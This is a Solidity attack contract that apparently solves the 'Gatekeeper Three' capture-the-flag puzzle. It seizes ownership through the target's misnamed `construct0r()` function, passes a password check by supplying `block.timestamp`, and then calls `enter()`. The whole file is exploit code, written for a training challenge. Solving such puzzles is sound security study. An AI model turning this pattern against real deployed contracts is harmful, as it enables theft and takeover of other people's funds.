// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256) external;
    function enter() external returns (bool);
}

contract GatekeeperThreeAttack {
    IGatekeeperThree public gatekeeperThree;
    address public owner;

    constructor(address _gatekeeperThreeAddress) {
        gatekeeperThree = IGatekeeperThree(_gatekeeperThreeAddress);
        owner = msg.sender;
    }

    function solveGateOne() public {
        require(msg.sender == owner, "Only owner can call this function");
        gatekeeperThree.construct0r();
    }

    function solveGateTwo() public {
        require(msg.sender == owner, "Only owner can call this function");
        gatekeeperThree.createTrick();
        gatekeeperThree.getAllowance(block.timestamp);
    }

    function attack() external {
        // Become an entrant
        gatekeeperThree.enter();
    }
}
